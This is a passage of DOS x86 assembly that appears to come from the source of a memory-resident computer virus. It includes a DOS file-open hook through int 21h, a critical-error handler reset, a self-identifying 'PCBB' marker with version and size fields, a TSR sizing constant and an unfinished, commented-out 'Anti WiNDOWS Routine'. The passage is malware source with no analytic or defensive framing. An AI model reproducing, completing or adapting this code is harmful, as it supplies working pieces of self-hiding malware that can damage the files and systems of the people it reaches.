                cmp     cx,3
                jne     close_wp

                cmp     word wpbuff[1],'PW'

                jne     close_wp

                inc     si
close_wp:
                mov     ah,3Eh
                call    int21
                cmp     si,0
                je      not_wp

fuck_wp:        pop     si
                call    reset_i24
                call    pop_all
                popf
                mov     ax,4
                stc
                retf 2
not_wp:
                mov     ah,3Dh
                ret

;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
;                             Anti WiNDOWS Routine
;                     (Just started... Not at all ready!!!)
;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
windows:
                ret

;;                call    push_all
;                xchg    cx,ax
;                mov     di,dx
;                push    ds
;                pop     es
;                cld
;                xor     al,al
;winsrc:         repnz   scasb
;                jne     win_fail
;
;                sub     di,8
;                xchg    si,di


;db 'Elo‹, Elo‹, lam  sabakt ni?'

dummy           db 18h dup(0)   ;3

version         db ver                          ;\
size            dw (offset total)-100h          ; > 6 bytes
db 'PCBB'                                       ;/

total:
        tsr_para        equ ((1024*6)/16) +2 ;equ (($-100h / 16)+2)*2


